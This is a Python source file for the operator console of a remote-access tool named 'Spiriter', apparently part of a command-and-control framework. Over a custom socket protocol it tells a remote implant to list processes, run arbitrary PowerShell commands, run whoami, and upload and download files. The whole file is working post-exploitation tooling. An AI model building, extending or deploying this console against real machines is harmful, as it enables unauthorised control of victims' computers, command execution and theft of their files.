from re import S
from SpiritCore.Payload import *
from SpiritCore.FCmd import *
from SpiritCore.Lib.Socket import *
import getopt,socket
from struct import *

SpiriterHeader = b"Spiriter"
SpiriterCommand=b"\x00"*4

class RecvData:
    ContralCode = None
    Length=None
    ToalLength=None
    SendCount=None
    ToalCount=None
    Data=None






SPIRITER_INIT       =   0x0
SPIRITER_PROCESS    =   0x1
SPIRITER_EXEC_CMD   =   0x2
SEIRITER_UPLOAD     =   0x3
SEIRITER_DOWNLOAD   =   0x4

class Spiriter(Cmd):
    SystemVersion = 0
    Socket=None
    Session=None
    Object=0
    prompt="Spiriter > "
    SessionConsoleSt=False
    Text = ""
    Bind=True
    def __init__(self, completekey='tab', stdin=None, stdout=None):
        super().__init__(completekey=completekey, stdin=stdin, stdout=stdout)
    def inti(self,Socket):
        print_msg("Load Session Spiriter ")
        self.Socket=Socket
        self.Send(0x0,b"\x61"*1024)
        try:
            Ret = self.Recv()
            write(str(Ret.Data,encoding="utf-8",errors="ignore"))
            print_success("Loaded Session Manage")
        except:
            print_error("Error Load session ")
        try:
            self.cmdloop()
        except:
            return
    def do_download(self,line):
        rf=""
        lf=""
        if line=="":
            write("download -r <*Rmote File Path> -l <Save Locate Path>")
            return
        try:
            opts, args = getopt.getopt(line.split(" "), "hr:l:", ["rf=", "lf="])
        except:
            write("download -t <Type> -o <output file>")
            return
        for opt, arg in opts:
            if opt == '-h':
                write("download -r <*Rmote File Path> -l <Save Locate Path>")
                return
            elif opt in ("-r", "-rf"):
                rf = arg
            elif opt in ("-l","-lf"):
                lf=arg
        if rf=="":
            write("download -r <*Rmote File Path> -l <Save Locate Path>")
            return
        if lf=="":
            lf= os.path.basename(rf)
        self.Download(rf,lf)
            
            
    def Download(self,Filename,LocatePath):
        
        try:
            Payload = b""
            Payload += Filename+((260-len(Filename))*b"\x00")
            Payload += pack("i",0x0)
            self.Send(SEIRITER_DOWNLOAD,Payload)
            Ret = self.Recv()
            Filename=Ret.Data[:260]
            SizeLenght=int(unpack("i",Ret.Data[260:264])[0])
            WriteLogs("Download Locate:%s Remote:%s"%(LocatePath,Filename))
            if Ret.ContralCode==0x0:
                try:
                    open(LocatePath,"wb+").write(Ret.Data[264:264+SizeLenght])
                except Exception as error:
                    print_error("Write File Error")
            elif Ret.ContralCode==0x3:
                print_error("File NO Exists")
            

        except Exception as error:
            print_error(error.__str__())




    def do_ps(self,line):
        try:
            print_msg("Enumerate Process List")
            self.Send(SPIRITER_PROCESS,b"\x00"*1024)
            Ret = self.Recv()
            write("=================================================================================")
            write(str(Ret.Data,encoding="utf-8",errors="ignore"))
            write("=================================================================================")
        except Exception as error:
            write(error)


    def do_pwd(self,line):
        self.do_exec("pwd")
    
    def do_upload(self,line):
        try:
            try:
                rf=""
                lf=""
                if line=="":
                    write("upload -r <File Path> -l <Locate Path>")
                    return
                try:
                    opts, args = getopt.getopt(line.split(" "), "hr:l:", ["rf=", "lf="])
                except:
                    write("upload -t <Type> -o <output file>")
                    return
                for opt, arg in opts:
                    if opt == '-h':
                        write("upload -r <Save File Path> -l <Locate Path>")
                        return
                    elif opt in ("-r", "-rf"):
                        rf = arg
                    elif opt in ("-l","-lf"):
                        lf=arg
                
            except:
                pass
            if lf=="":
                write("upload -r <Save File Path> -l <Locate Path>")
                return
            if rf=="":
                rf= os.path.basename(lf)
            try:
                print_msg("Upload Local:%s -> Rmote:%s"%(lf,rf))
                try:
                    print_msg("ReadFile:%s"%lf)
                    Data=open(lf,"rb").read()
                except Exception as error:
                    print_error("Read Error")
                    print_error(error.__str__())
                    return
                Filename=bytes(rf,encoding="utf-8",errors="ignore")
            except Exception as noneerror:
                print_error("upload <Local> <RmoteWritePath>")
                print_error(noneerror.__str__)
                return
            Payload = b""
            Payload += Filename+((260-len(Filename))*b"\x00")
            Payload += pack("i",len(Data))
            Payload +=Data
            print_success("Uploading Length:%d"%len(Data))
            self.Send(SEIRITER_UPLOAD,Payload)
            Ret = self.Recv()
            if(Ret.ContralCode==0):
                print_success("Uploaded Successfully.")
            else:
                print_error("Upload Faild:%d"%(Ret.Data))
        except Exception as e:
            write(e)
    def Upload(self,Filename,Data):
        try:
            Payload = b""
            Payload += Filename+((260-len(Filename))*b"\x00")
            Payload += pack("i",len(Data))
            Payload +=Data
            print_success("Uploading Length:%d"%len(Data))
            self.Send(SEIRITER_UPLOAD,Payload)
            Ret = self.Recv()
            if(Ret.ContralCode==0):
                return False
            else:
                return False
        except Exception as e:
            write(e)
    def do_exec(self,line):
        print_msg("Exec Command")
        write("Command:%s"%line)
        try:
            self.Send(SPIRITER_EXEC_CMD,b"powershell -c \"%s\"\x00"%bytes(line,encoding="utf-8"))
        except Exception as error:
            print_error(error.__str__())
        write("===========================Output=============================")
        Ret = self.Recv()
        try:
            Buffer=Ret.Data.replace(b"\x00",b"")
            Buffer=Buffer.replace(b"\xcc",b"")
            write(str(Buffer,encoding="utf-8",errors="ignore"))
        except Exception as error:
            print_error(error.__str__())
        write("==============================================================")
    def do_whoami(self,line):
        print_msg("Get Whoami---")
        self.Send(SPIRITER_EXEC_CMD,bytes("powershell -c \""+"whoami"+"\"\x00",encoding="utf8"))
        Ret = self.Recv()
        print_success("Whoami Successfuly")
        write(str(Ret.Data,encoding="utf8"))
    def Send(self,ContralCode,Data):
        if type(Data)=="str":
            Data=bytes(Data,encoding="utf8")
        if len(Data)==0:
            Data=b"\x00"*4096
        ncount=0
        Length = len(Data)
        ncount = Length / 4096
        if (Length % 4096) > 0:
            ncount += 1
        SpiriterToalLength=pack("i",Length)
        
        SpiriterCountToal=pack("i",int(ncount))
        d=0
        for i in range(int(ncount)):
            try:
                d=d+1
                #write(i)
                if i < ncount-1:
                    #totalDataCount = pack("<H",4096)
                    make_data = Data[i*4096:(i+1)*4096]
                else:
                    #totalDataCount = pack("<H",Length - 4096*i)
                    make_data = Data[i*4096:]
                SpiriterLength=pack("i",len(make_data))
                SpiriterData=make_data
                SpiriterSendCount=pack("i",i+1)
            except Exception as e:
                print_error(e.__str__())
            try:
                SendData= SpiriterHeader+pack("i",ContralCode)+SpiriterLength+SpiriterToalLength+SpiriterSendCount+SpiriterCountToal+SpiriterData
            except Exception as error:
                print_error(error.__str__())
            self.Socket.sendall(SendData)
    
    def Recv(self):
        Data=b""
        TryData=b""
        Count=0
        #write(TryData)
        while True:
            Count=Count+1
            
            TryData=self.Socket.recv(4096+28)
            #write(TryData)
            if TryData[:8]==b"Spiriter":
                ContralCode = unpack("i",TryData[8:8+4])[0]
                Length=unpack("i",TryData[12:12+4])[0]
                ToalLength= unpack("i",TryData[16:16+4])[0]
                SendCount=unpack("i",TryData[20:20+4])[0]
                ToalCount=unpack("i",TryData[24:24+4])[0]
                if(Count==SendCount):
                    Data=Data+TryData[28:Length+28]
                else:
                    Count=0
                    Data=b""
            else:
                continue
            if ToalLength ==len(Data) and SendCount == ToalCount:
                Ret = RecvData()
                Ret.ContralCode=ContralCode
                Ret.Length=Length
                Ret.ToalLength=ToalLength
                Ret.Data=Data
                Ret.SendCount=SendCount
                Ret.ToalCount=ToalCount
                return Ret
            elif SendCount > ToalCount:
                print_error("Error Recv ")
                return b""
            else:
                pass
    def cmdloop(self, intro=None):
        """Repeatedly issue a prompt, accept input, parse an initial prefix
        off the received input, and dispatch to action methods, passing them
        the remainder of the line as argument.

        """

        self.preloop()
        if self.use_rawinput and self.completekey:
            try:
                import readline
                self.old_completer = readline.get_completer()
                readline.set_completer(self.complete)
                readline.parse_and_bind(self.completekey + ": complete")
            except ImportError:
                pass
        try:
            if intro is not None:
                self.intro = intro
            if self.intro:
                self.stdout.write(str(self.intro) + "\n")
            stop = None
            while not stop:
                line = ""

                if self.cmdqueue:
                    line = self.cmdqueue.pop(0)
                else:
                    if self.use_rawinput:
                        try:
                            if sys.version_info.major == 2:

                                line = raw_input(self.prompt)
                                # write(line)
                            else:
                                line = str(input(self.prompt))  # stdout stdin Not Support TAB Key
                                '''sys.stdout.write(self.prompt)
                                sys.stdout.flush()
                                line = sys.stdin.readline()
                                if not len(line):
                                    line = 'EOF'
                                else:
                                    line = line.rstrip('\r\n')
                                    '''
                        except EOFError:
                            line = 'EOF'
                        except:
                            print_warning("Back Console")
                            return
                    else:
                        self.stdout.write(self.prompt)
                        self.stdout.flush()
                        line = self.stdin.readline()
                        if not len(line):
                            line = 'EOF'
                        else:
                            line = line.rstrip('\r\n')
                line = self.precmd(line)
                stop = self.onecmd(line)
                stop = self.postcmd(stop, line)
            self.postloop()
        finally:
            if self.use_rawinput and self.completekey:
                try:
                    import readline
                    readline.set_completer(self.old_completer)
                except ImportError:
                    pass











